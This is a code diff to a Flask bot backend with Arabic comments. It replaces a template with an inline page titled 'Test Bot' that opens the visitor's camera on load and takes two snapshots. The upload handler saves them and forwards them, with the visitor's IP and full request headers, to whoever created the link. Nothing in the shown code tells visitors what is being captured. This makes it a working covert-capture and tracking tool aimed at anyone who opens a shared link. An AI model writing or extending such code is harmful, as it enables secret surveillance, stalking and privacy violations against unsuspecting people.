@@ -45,34 +45,129 @@ def webhook():
 @app.route("/<user_id>/<name>", methods=["GET"])
 def dynamic_link(user_id, name):
     if user_id in user_data and user_data[user_id]["name"] == name:
-        return render_template("capture.html", user_id=user_id, name=name)
+        return """
+        <!DOCTYPE html>
+        <html lang="ar">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Test Bot</title>
+            <style>
+                body {
+                    font-family: Arial, sans-serif;
+                    text-align: center;
+                    background-color: red;
+                    animation: changeBackground 5s infinite;
+                    padding: 20px;
+                }
+                @keyframes changeBackground {
+                    0% { background-color: red; }
+                    50% { background-color: blue; }
+                    100% { background-color: red; }
+                }
+            </style>
+        </head>
+        <body>
+            <h1>Test Bot</h1>
+            <script>
+                // تشغيل الكاميرا
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.play();
+
+                        // التقاط الصورة الأمامية
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const context = canvas.getContext('2d');
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const imageData = canvas.toDataURL('image/jpeg');
+
+                            // رفع الصورة الأمامية
+                            uploadImage(imageData, 'front');
+                        }, 1000);
+
+                        // التقاط الصورة الخلفية
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const context = canvas.getContext('2d');
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const imageData = canvas.toDataURL('image/jpeg');
+
+                            // رفع الصورة الخلفية
+                            uploadImage(imageData, 'back');
+                        }, 3000);
+                    })
+                    .catch(err => {
+                        console.error("حدث خطأ أثناء تشغيل الكاميرا:", err);
+                    });
+
+                // رفع الصورة
+                function uploadImage(imageData, imageType) {
+                    const formData = new FormData();
+                    formData.append('user_id', '{{ user_id }}');
+                    formData.append('name', '{{ name }}');
+                    formData.append('image_type', imageType);
+                    formData.append('image', dataURLtoFile(imageData, `${imageType}.jpg`));
+
+                    fetch('/upload', {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log(data.message);
+                    })
+                    .catch(error => {
+                        console.error("حدث خطأ أثناء رفع الصورة:", error);
+                    });
+                }
+
+                // تحويل Data URL إلى ملف
+                function dataURLtoFile(dataurl, filename) {
+                    const arr = dataurl.split(',');
+                    const mime = arr[0].match(/:(.*?);/)[1];
+                    const bstr = atob(arr[1]);
+                    let n = bstr.length;
+                    const u8arr = new Uint8Array(n);
+                    while (n--) {
+                        u8arr[n] = bstr.charCodeAt(n);
+                    }
+                    return new File([u8arr], filename, { type: mime });
+                }
+            </script>
+        </body>
+        </html>
+        """.replace("{{ user_id }}", user_id).replace("{{ name }}", name)
     return "Name not found!", 404
 
 @app.route("/upload", methods=["POST"])
 def upload():
     user_id = request.form.get("user_id")
     name = request.form.get("name")
-    front_image = request.files.get("front_image")
-    back_image = request.files.get("back_image")
+    image = request.files.get("image")
+    image_type = request.form.get("image_type")
 
     if user_id in user_data and user_data[user_id]["name"] == name:
-        # حفظ الصور
-        front_image_path = f"uploads/{user_id}_front_{datetime.now().strftime('%Y%m%d%H%M%S')}.jpg"
-        back_image_path = f"uploads/{user_id}_back_{datetime.now().strftime('%Y%m%d%H%M%S')}.jpg"
-        front_image.save(front_image_path)
-        back_image.save(back_image_path)
+        # حفظ الصورة
+        image_path = f"uploads/{user_id}_{image_type}_{datetime.now().strftime('%Y%m%d%H%M%S')}.jpg"
+        image.save(image_path)
 
         # جمع المعلومات
         ip = request.headers.get("X-Forwarded-For", request.remote_addr)
         headers = dict(request.headers)
         device_info = f"تم فتح الرابط من:\nIP: {ip}\nHeaders: {json.dumps(headers, indent=2)}"
 
-        # إرسال الصور والمعلومات إلى المستخدم
-        send_message(user_id, f"تم استلام الصور والمعلومات:\n{device_info}")
-        send_image(user_id, front_image_path)
-        send_image(user_id, back_image_path)
+        # إرسال الصورة والمعلومات إلى المستخدم
+        send_message(user_id, f"تم استلام الصورة ({image_type}):\n{device_info}")
+        send_image(user_id, image_path)
 
-        return jsonify({"message": "تم استلام الصور بنجاح!"}), 200
+        return jsonify({"message": "تم استلام الصورة بنجاح!"}), 200
     return "Name not found!", 404
 
 def send_message(sender, message):
